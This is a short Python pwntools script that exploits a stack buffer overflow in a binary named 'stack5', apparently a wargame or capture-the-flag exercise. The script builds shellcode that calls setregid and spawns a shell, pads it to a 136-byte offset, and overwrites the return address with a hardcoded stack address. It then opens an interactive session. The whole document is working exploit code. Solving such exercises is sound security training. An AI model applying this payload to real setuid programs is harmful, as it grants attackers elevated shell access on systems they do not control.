from pwn import *

elf = ELF('./stack5')

context.binary = elf

off = 136
# we obtain the address of the buffer by running the program in
# gdb with an empty environment (set exec-wrapper env -i)
buffer = 0x7fffffffec40

# we run the process with an empty environment and a full path in argv[0]
io = process("/home/stack5/stack5", env={})

payload  = asm(shellcraft.setregid())
payload += asm(shellcraft.sh())
payload += b"A" * (off - len(payload))
payload += p64(buffer)

io.sendline(payload)
io.interactive()
